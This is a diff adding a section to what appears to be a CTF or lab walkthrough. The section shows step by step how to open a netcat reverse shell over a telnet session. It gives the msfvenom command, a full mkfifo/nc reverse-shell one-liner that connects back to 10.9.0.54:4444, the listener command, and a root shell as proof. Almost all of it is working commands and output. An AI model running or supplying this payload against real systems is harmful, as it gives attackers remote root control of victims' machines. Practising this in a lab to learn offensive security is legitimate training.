@@ -54,3 +54,50 @@ root
 
 Root is yours! Congrats!
 
+---
+
+## Netcat Reverse Shell
+
+Case: Telnet connection
+
+### Script
+
+Generate and encode a netcat reverse shell:
+```
+$ msfvenom -p cmd/unix/reverse_netcat lhost=<local_IP> lport=4444 R
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 91 bytes
+mkfifo /tmp/wqivu; nc 10.9.0.54 4444 0</tmp/wqivu | /bin/sh >/tmp/wqivu 2>&1; rm /tmp/wqivu
+```
+* -p - payload
+* lhost - local host IP address
+* lport - the port to listen on
+* R - export the payload in raw format
+
+2. Start a netcat listener:
+```
+$ nc -lvp <listening_port>
+```
+
+3. Copy and paste msfvenom payload into the telnet session 
+```
+.RUN mkfifo /tmp/wqivu; nc 10.9.0.54 4444 0</tmp/wqivu | /bin/sh >/tmp/wqivu 2>&1; rm /tmp/wqivu
+```
+
+5. Check in netcat session, if you have a reverse shell:
+```
+$ pwd
+/root
+```
+
+Congrats!
+
+---
+
+
+
+
+
+
